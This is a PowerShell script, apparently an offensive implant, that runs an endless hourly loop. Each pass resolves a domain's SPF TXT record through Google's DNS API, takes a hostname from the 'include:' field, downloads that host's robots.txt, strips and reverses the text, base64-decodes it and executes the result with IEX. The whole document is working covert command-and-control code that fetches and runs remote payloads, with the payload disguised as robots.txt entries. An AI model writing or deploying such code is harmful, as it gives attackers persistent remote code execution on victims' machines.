function Invoke-SPFtrigger
{
 while($true)
 {
  $hostn = ""
  $spf = (New-Object System.Net.Webclient).DownloadString("https://dns.google.com/resolve?name=yourdomainhere.nl&type=Txt")
  $offsetA = $spf.IndexOf("v=spf1 include:")+15
  $offsetB = $spf.IndexOf("-all")-1
  $hostn = $spf.substring($offsetA,$offsetB-$offsetA)
  if ($hostn.Length -ge 3 ){
    $dl = (New-Object System.Net.Webclient).DownloadString("http://" + $hostn + "/robots.txt")
    $dl = $dl.Replace(".html`n", "")
    $dl = $dl.Replace("Disallow: /", "")
    $dl = $dl[-1..-($dl.length)] -join ""
    $c = [System.Convert]::FromBase64String($dl)
    $st = [System.Text.Encoding]::ASCII.GetString($c)
    IEX($st);
  }
  sleep(3600)
 }
}

Invoke-SPFtrigger
